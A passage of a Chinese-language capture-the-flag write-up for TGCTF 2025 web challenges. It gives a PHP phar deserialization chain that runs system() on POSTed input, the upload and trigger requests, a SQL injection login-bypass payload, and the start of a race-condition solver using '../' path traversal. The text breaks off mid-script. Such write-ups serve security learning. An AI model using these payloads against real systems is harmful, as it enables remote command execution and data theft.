delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">yesterday</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$learn</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$study</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"study\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$try</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">learn</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"learn&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You studied hard yesterday.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">study</span><span class=\"token operator\">-></span><span class=\"token function\">hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">today</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$doing</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$did</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$done</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">did</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"What you did makes you outstanding.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"And what you've done has given you a choice.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">doing</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token operator\">-></span><span class=\"token property\">better</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tommoraw</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$bad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$soso</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be good tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bad</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be bad tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">future</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$impossible</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"How can you get here?&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$useful1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful2</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful3</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful4</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful5</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful6</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful7</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful8</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful9</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful10</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful11</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful12</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful13</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful14</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful15</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful16</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful17</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful18</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful19</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful20</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">out</span><span class=\"token operator\">-></span><span class=\"token property\">useful7</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Seven is my lucky number&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"This is your future.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"wow\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"win\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">yesterday</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">today</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">-></span> <span class=\"token property\">doing</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">future</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 后缀必须为phar</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"evil.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 设置 stubb</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"GIF89a&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/**\n将自定义的 meta-data 存入 manifest\n这个函数需要在php.ini中修改 phar.readonly 为 Off\n否则的话会抛出 \ncreating archive \"***.phar\" disabled by the php.ini setting phar.readonly \n异常.\n*/</span>\n<span class=\"token variable\">$$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 添加需压缩的文件</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$uploadDir</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploadDir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploadDir</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0777</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 白名单允许的扩展名</span>\n    <span class=\"token variable\">$allowedExtensions</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'atg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$fileName</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$fileExtension</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 检查文件扩展名</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileExtension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowedExtensions</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$uploadFile</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$uploadDir</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$fileName</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$uploadFile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件已保存到：<span class=\"token interpolation\"><span class=\"token variable\">$uploadFile</span></span> ！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件保存出错！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>允许上传atg文件。</p>\n<p>后面易得：</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">940</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary1OUR0mqZmZ8AtAOc</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:30759/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary1OUR0mqZmZ8AtAOc\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"file\"; filename=\"evil.atg\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\nGIF89a&lt;?php __HALT_COMPILER(); ?>\n此处有不可见字符省略。内容为上述脚本生成的phar\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/class.php?filename=phar://./uploads/evil.atg/test.txt</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">7</span></span>\n\nwow=env</code></pre>\n\n<h3 id=\"TGCTF-2025-后台管理\"><a href=\"#TGCTF-2025-后台管理\" class=\"headerlink\" title=\"TGCTF 2025 后台管理\"></a>TGCTF 2025 后台管理</h3><p>反斜杠转义字符串中的’，然后在password里打SQL注入。</p>\n<p>误打误撞试出来flag在flag表里（（（</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/login</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">124.71.147.99:9045</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">48</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://124.71.147.99:9045</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://124.71.147.99:9045/login</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\nusername=1\\&amp;password=union select *,2 from flag#</code></pre>\n\n<p>在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}</p>\n<h3 id=\"老登，炸鱼来了？\"><a href=\"#老登，炸鱼来了？\" class=\"headerlink\" title=\"老登，炸鱼来了？\"></a>老登，炸鱼来了？</h3><p>竞争safe变量。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> aiohttp\n<span class=\"token keyword\">import</span> asyncio\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Solver</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> baseUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>baseUrl <span class=\"token operator\">=</span> baseUrl\n        self<span class=\"token punctuation\">.</span>READ_FILE_ENDPOINT <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>baseUrl<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n        self<span class=\"token punctuation\">.</span>VALID_CHECK_PARAMETER <span class=\"token operator\">=</span> <span class=\"token string\">'/write?name=123.md&amp;content=flag&amp;format=markdown'</span>\n        self<span class=\"token punctuation\">.</span>INVALID_CHECK_PARAMETER <span class=\"token operator\">=</span> <span class=\"token string\">'/read?name=../../../../../flag'</span>\n        self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS <span class=\"token operator\">=</span> <span class=\"token number\">100</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">setSessionCookie</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">await</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>baseUrl<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">raceValidationCheck</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> parameter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>READ_FILE_ENDPOINT<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>parameter<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">with</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> response<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">await</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">raceCondition</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> 